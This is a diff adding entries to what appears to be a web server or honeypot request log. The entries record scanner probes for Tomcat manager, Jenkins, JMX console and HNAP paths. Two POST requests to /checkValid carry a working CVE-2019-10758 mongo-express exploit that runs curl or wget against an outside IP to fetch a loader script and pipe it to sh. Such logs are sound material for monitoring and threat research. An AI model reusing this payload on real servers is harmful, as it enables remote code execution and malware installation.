@@ -1282,3 +1282,33 @@ GET / -  {}
 GET http://fuwu.sogou.com/404/index.html -  {}
 GET http://fuwu.sogou.com/404/index.html -  {}
 GET / -  {}
+GET /manager/text/list -  {}
+GET / -  {}
+GET / -  {}
+GET /manager/html -  {}
+GET / -  {}
+GET / -  {}
+GET /checkValid -  {}
+POST /checkValid -  {
+  document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent cve_2019_10758 http://194.145.227.21/ldr.sh||wget --user-agent cve_2019_10758 -q -O - http://194.145.227.21/ldr.sh)|sh")'
+}
+GET /login -  {}
+GET /jenkins/login -  {}
+GET / -  {}
+GET /manager/html -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET /HNAP1/ -  {}
+GET / -  {}
+GET http://passport.baidu.com/ -  {}
+GET /jmx-console/ -  {}
+HEAD http://112.124.42.80:63435/ -  {}
+GET /checkValid -  {}
+POST /checkValid -  {
+  document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent cve_2019_10758 http://194.145.227.21/ldr.sh||wget --user-agent cve_2019_10758 -q -O - http://194.145.227.21/ldr.sh)|sh")'
+}
+GET /login -  {}
+GET /jenkins/login -  {}
+GET / -  {}
+GET /manager/html -  {}
